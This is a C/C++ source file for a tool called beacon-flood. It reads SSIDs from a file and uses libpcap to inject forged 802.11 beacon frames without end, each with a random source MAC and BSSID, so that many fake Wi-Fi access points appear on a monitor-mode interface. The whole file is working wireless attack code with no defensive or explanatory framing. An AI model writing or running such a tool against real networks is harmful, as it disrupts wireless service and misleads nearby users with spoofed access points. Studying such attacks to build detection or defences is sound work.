#include <pcap.h>
#include <stdbool.h>
#include <stdio.h>
#include "mac.h"
#include <unordered_map>
#include <string>
#include <stdlib.h>
#include <iostream>
#include <vector>
using namespace std;

typedef struct {
	char* dev_;
    vector <string> ssid_list;
} Param;

Param param = {
	.dev_ = NULL
};

#pragma pack(push, 1)
struct Radiotap{
	uint8_t _version;
	uint8_t _pad;
	uint16_t _len;
	uint32_t _present;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct Beacon{
	uint16_t _version;
	uint16_t _pad;
	Mac _da;
	Mac _sa;
	Mac _bssid;
	// dummy
	uint8_t dummy[14];
};
#pragma pack(pop)

#pragma pack(push, 1)
struct Tagged{
	uint8_t _id;
	uint8_t _len;
};
#pragma pack(pop)


void usage() {
	printf("syntax : beacon-flood <interface> <ssid-list-file>\n");
	printf("sample : beacon-flood mon0 ssid-list.txt\n");
}

bool parse(Param* param, int argc, char* argv[]) {
	if (argc != 3) {
		usage();
		return false;
	}
	param->dev_ = argv[1];
    FILE* fp = fopen(argv[2], "r");
    char buf[0x100] = {0};
    while(fgets(buf, 0x100, fp)) {
        if(buf[strlen(buf) - 1] == '\n') buf[strlen(buf) - 1] =  0;
        param->ssid_list.push_back(buf);
    }
	fclose(fp);	
	return true;
}

int main(int argc, char* argv[]) {
	if (!parse(&param, argc, argv))
		return -1;

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
		return -1;
	}

    // packet construct
	while(1) {
    	for (auto ssid : param.ssid_list) {
			Radiotap radiotap;
			memset(&radiotap, 0, sizeof(Radiotap));
			radiotap._len = 0x8;
			Beacon beacon;
			memset(&beacon, 0, sizeof(Beacon));
			
			beacon._version = 0x80;
			beacon._da = Mac::broadcastMac();
			beacon._sa = Mac::randomMac();
			beacon._bssid = Mac::randomMac();

			Tagged tagged;
			memset(&tagged, 0, sizeof(Tagged));

			tagged._len = ssid.length();

			u_char buf[BUFSIZ];
			memcpy(buf, &radiotap, sizeof(Radiotap));
			memcpy(buf + sizeof(Radiotap), &beacon, sizeof(Beacon));
			memcpy(buf + sizeof(Radiotap) + sizeof(Beacon), &tagged, sizeof(Tagged));
			memcpy(buf + sizeof(Radiotap) + sizeof(Beacon) + sizeof(Tagged), ssid.c_str(), ssid.length());
    		// packet send
    		pcap_sendpacket(pcap, buf, sizeof(Radiotap) + sizeof(Beacon) + sizeof(Tagged) + ssid.length());
		}
	}

    

	pcap_close(pcap);
}
